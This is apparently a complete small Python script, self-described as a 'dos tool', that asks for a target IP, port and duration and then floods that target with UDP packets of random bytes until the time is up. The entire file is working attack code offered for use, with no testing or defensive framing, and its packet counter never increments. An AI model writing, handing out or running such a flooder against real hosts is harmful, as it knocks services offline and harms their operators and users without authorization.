# -*- coding: utf-8 -*-
"""
Created on Fri Mar 19 16:34:25 2021

@author: Dimitris Vervitis
"""

import os
import sys 
import time
import socket 
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

os.system("clear")
print('welcome to dos tool')
print("")
ip = input("Enter target ip :")
port = int(input("Enter target port:"))
dur = int(input("Enter duration (sec):"))
timeout = time.time() + dur 
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes,(ip,port))
        print("Sent ", sent , "packets to ",ip,'through',port)
    except KeyboardInterrupt:
        sys.exit()